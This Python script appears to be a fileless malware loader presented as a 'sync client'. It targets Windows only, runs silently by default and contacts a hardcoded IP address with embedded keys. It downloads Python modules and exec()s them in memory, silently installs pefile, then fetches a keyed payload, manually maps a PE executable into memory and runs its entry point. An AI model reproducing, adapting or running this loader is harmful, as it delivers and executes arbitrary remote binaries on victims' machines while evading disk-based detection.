from __future__ import annotations

import argparse
import importlib
import os
import subprocess
import sys
import types
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any, Optional
from urllib.parse import urlparse

# ─── CONFIG ───────────────────────────────────────────────────────────────────
CONFIG: dict[str, Any] = {
    "HOST": "172.237.119.163",
    "PORT": 8765,
    "ASSET": "main",
    "API_KEY": "test123",
    "PAYLOAD_KEY": "secret456",
    "MAP_ONLY": False,
    "QUIET": True,     
    "VERBOSE": False,
    "KEEP": False,
    "FORCE_SYNC": False,
    "MEMORY": True, 
}
# ──────────────────────────────────────────────────────────────────────────────

CLIENT_MODULES = ("pe_core.py", "manual_mapper.py")
PIP_PACKAGES = ("pefile",)


def _build_url(cfg: dict) -> str:
    return f"http://{cfg['HOST']}:{cfg['PORT']}/api/v1/sync?asset={cfg['ASSET']}"


def _log(msg: str, cfg: dict) -> None:
    if cfg.get("VERBOSE") and not cfg.get("QUIET"):
        print(msg)


def _server_base(sync_url: str) -> str:
    return f"{urlparse(sync_url).scheme}://{urlparse(sync_url).netloc}"


def _fetch_module(base: str, name: str, api_key: str) -> bytes:
    headers = {"User-Agent": "SyncClient/1.0"}
    if api_key:
        headers["Authorization"] = f"Bearer {api_key}"
    req = urllib.request.Request(f"{base}/api/v1/client/{name}", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        if exc.code == 404:
            raise RuntimeError(f"server missing {name}") from exc
        if exc.code == 401:
            raise RuntimeError("auth failed (401)") from exc
        raise RuntimeError(f"download {name} HTTP {exc.code}") from exc


def ensure_pip(cfg: dict) -> None:
    missing = [p for p in PIP_PACKAGES if not _try_import(p)]
    if not missing:
        return
    _log(f"install: {', '.join(missing)}", cfg)
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", *missing, "-q"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def _try_import(name: str) -> bool:
    try:
        importlib.import_module(name)
        return True
    except ImportError:
        return False


def _load_module_memory(name: str, data: bytes) -> None:
    mod_name = name[:-3]
    sys.modules.pop(mod_name, None)
    module = types.ModuleType(mod_name)
    module.__file__ = name
    module.__loader__ = None
    sys.modules[mod_name] = module
    exec(compile(data, name, "exec"), module.__dict__)  # noqa: S102


def bootstrap(cfg: dict, url: str) -> None:
    if sys.platform != "win32":
        raise RuntimeError("win32 only")
    root = Path(__file__).resolve().parent
    if str(root) not in sys.path:
        sys.path.insert(0, str(root))
    ensure_pip(cfg)
    base = _server_base(url)
    force = cfg.get("FORCE_SYNC", False)
    use_memory = cfg.get("MEMORY", True)

    if force:
        for name in CLIENT_MODULES:
            sys.modules.pop(name[:-3], None)

    for name in CLIENT_MODULES:
        mod_name = name[:-3]
        if not force and _try_import(mod_name):
            _log(f"skip {mod_name}", cfg)
            continue
        data = _fetch_module(base, name, cfg["API_KEY"])
        if use_memory:
            _load_module_memory(name, data)
            _log(f"loaded {mod_name} (ram)", cfg)
        else:
            dest = root / name
            if force or not dest.exists():
                dest.write_bytes(data)
            _log(f"saved {dest}", cfg)


def run_sync(**overrides: Any) -> int:
    """Silent run. Returns mapped image base. One-liner: run_sync()"""
    cfg = {**CONFIG, **overrides}
    url = overrides.get("url") or _build_url(cfg)
    bootstrap(cfg, url)
    map_from_server = importlib.import_module("manual_mapper").map_from_server
    verbose = bool(cfg.get("VERBOSE") and not cfg.get("QUIET"))
    return map_from_server(
        url,
        api_key=cfg["API_KEY"],
        payload_key=cfg["PAYLOAD_KEY"],
        verbose=verbose,
        run_entry=not cfg.get("MAP_ONLY", False),
    )


def run(cfg: Optional[dict] = None) -> int:
    cfg = dict(CONFIG if cfg is None else cfg)
    try:
        base = run_sync(**cfg)
        if cfg.get("VERBOSE") and not cfg.get("QUIET"):
            print(f"0x{base:X}")
        if cfg.get("KEEP"):
            input()
        return 0
    except Exception as exc:
        if not cfg.get("QUIET"):
            print(f"Error: {exc}", file=sys.stderr)
            if cfg.get("KEEP"):
                input()
        raise


def main() -> int:
    cfg = dict(CONFIG)
    p = argparse.ArgumentParser(description="Server mapper client")
    p.add_argument("url", nargs="?", help="Override sync URL")
    p.add_argument("--api-key", default="")
    p.add_argument("--payload-key", default="")
    p.add_argument("--map-only", action="store_true")
    p.add_argument("--force-sync", action="store_true")
    p.add_argument("--no-bootstrap", action="store_true")
    p.add_argument("--disk", action="store_true", help="Save modules to disk")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("-q", "--quiet", action="store_true")
    p.add_argument("--keep", action="store_true")
    args = p.parse_args()

    if args.url:
        url = args.url
    else:
        url = _build_url(cfg)
    if args.api_key:
        cfg["API_KEY"] = args.api_key
    if args.payload_key:
        cfg["PAYLOAD_KEY"] = args.payload_key
    if args.map_only:
        cfg["MAP_ONLY"] = True
    if args.force_sync:
        cfg["FORCE_SYNC"] = True
    if args.disk:
        cfg["MEMORY"] = False
    if args.verbose:
        cfg["VERBOSE"] = True
        cfg["QUIET"] = False
    if args.quiet:
        cfg["QUIET"] = True
        cfg["VERBOSE"] = False
    if args.keep:
        cfg["KEEP"] = True

    if args.no_bootstrap:
        map_from_server = importlib.import_module("manual_mapper").map_from_server
        base = map_from_server(
            url,
            api_key=cfg["API_KEY"],
            payload_key=cfg["PAYLOAD_KEY"],
            verbose=not cfg["QUIET"],
            run_entry=not cfg["MAP_ONLY"],
        )
    else:
        base = run_sync(url=url, **{k: v for k, v in cfg.items() if k != "url"})

    if not cfg.get("QUIET"):
        print(f"0x{base:X}")
    if cfg.get("KEEP"):
        input()
    return 0


if __name__ == "__main__":
    try:
        if len(sys.argv) == 1:
            raise SystemExit(run())
        raise SystemExit(main())
    except SystemExit:
        raise
    except Exception:
        if not CONFIG.get("QUIET"):
            input()
        raise SystemExit(1)
